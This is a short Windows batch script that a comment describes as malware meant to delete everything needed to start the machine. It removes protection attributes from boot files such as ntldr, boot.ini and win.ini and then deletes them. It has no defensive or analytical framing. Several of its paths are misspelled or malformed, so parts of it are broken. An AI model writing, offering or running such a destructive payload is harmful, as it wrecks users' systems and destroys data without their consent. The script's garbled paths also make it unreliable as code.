@echo off
attrib -r -s -h c:\autoexecu.bat
del c:\autoexecbat
attrib -r -s -h c:\boot.ini
del \c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

# This Malware will delete everything that required for to start machine
